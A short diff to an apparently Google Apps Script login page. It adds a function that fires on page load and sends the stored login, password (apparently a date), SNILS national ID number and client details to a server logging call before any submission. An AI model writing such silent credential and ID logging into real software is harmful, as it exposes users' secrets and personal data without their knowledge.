@@ -808,6 +808,20 @@
     google.script.run.logFormClick(loginVal);
   }
 
+  async function logInitialPageOpen() {
+    const loginVal = dom.login.value.trim();
+    const passwordForServer = toServerDate(formatDateInput(dom.password.value));
+    const snilsFormatted = formatSnilsInput(dom.snils.value);
+    const clientInfo = await getClientInfo();
+
+    google.script.run.logPageOpen({
+      login: loginVal,
+      password: passwordForServer,
+      snils: snilsFormatted,
+      clientInfo
+    });
+  }
+
   window.addEventListener('DOMContentLoaded', () => {
     const savedLogin = localStorage.getItem('savedLogin');
     const savedDate = localStorage.getItem('savedDate');
@@ -816,6 +830,8 @@
     if (savedLogin) dom.login.value = savedLogin;
     if (savedDate) dom.password.value = formatDateInput(savedDate);
     if (savedSnils) dom.snils.value = formatSnilsInput(savedSnils);
+
+    logInitialPageOpen();
   });
 
   const ENTRY_MAP = {
